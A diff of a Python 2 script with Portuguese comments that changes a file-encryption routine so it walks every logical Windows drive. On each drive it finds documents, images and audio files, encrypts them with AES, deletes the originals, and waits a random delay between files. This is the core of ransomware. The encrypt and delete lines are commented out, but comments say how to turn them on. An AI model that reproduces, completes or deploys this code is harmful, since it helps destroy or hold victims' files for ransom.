@@ -1,33 +1,34 @@
-import os, random, struct, hashlib, time
+import os, random, struct, hashlib, time, win32api
 from Crypto.Cipher import AES
 
 extensions = ['.mp3','.txt','.docx','.doc','.xlsx','.png','.jpg','jpeg']
 
 def pega_arquivos(key):
-    for root, dirs, files in os.walk("c:/"):
-        for file in files:
-            if file.endswith(tuple(extensions)):
-                in_filename = (os.path.join(root, file))
-                print "[+] - Arquivo Localizado = [+]"
-                print in_filename
-
-                #Encripta Arquivo
-                print "[!] - Encriptando Arquivo..."
-                #Se voce descomentar essa linha abaixo ele vai criar os arquivos encriptados
-                #encripta_arquivos(key,in_filename)
-                print "[+] - Arquivo Encriptando."
-
-                #Exclui arquivo original
-                print "[!] - Excluindo Arquivo Original..."
-                #Se voce descomentar essa linha abaixo ele vai apagar os arquivos originais
-                #os.remove(os.path.join(root, file))
-                print "[+] - Arquivo Original Excluido."
-
-                #Gera tempo para encriptar o proximo Arquivo
-                tempo_ale = random.randint(1, 10)
-                print "[+] - Proxima Execucao em %s Segundos" %tempo_ale
-                time.sleep(tempo_ale)
-                print
+    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
+        for root, dirs, files in os.walk(drive):
+            for file in files:
+                if file.endswith(tuple(extensions)):
+                    in_filename = (os.path.join(root, file))
+                    print "[+] - Arquivo Localizado = [+]"
+                    print in_filename
+    
+                    #Encripta Arquivo
+                    print "[!] - Encriptando Arquivo..."
+                    #Se voce descomentar essa linha abaixo ele vai criar os arquivos encriptados
+                    #encripta_arquivos(key,in_filename)
+                    print "[+] - Arquivo Encriptando."
+    
+                    #Exclui arquivo original
+                    print "[!] - Excluindo Arquivo Original..."
+                    #Se voce descomentar essa linha abaixo ele vai apagar os arquivos originais
+                    #os.remove(os.path.join(root, file))
+                    print "[+] - Arquivo Original Excluido."
+    
+                    #Gera tempo para encriptar o proximo Arquivo
+                    tempo_ale = random.randint(1, 10)
+                    print "[+] - Proxima Execucao em %s Segundos" %tempo_ale
+                    time.sleep(tempo_ale)
+                    print
     print "[+] - Execucao finalizada"
 
 def encripta_arquivos(key, in_filename, out_filename=None, chunksize=64*1024):
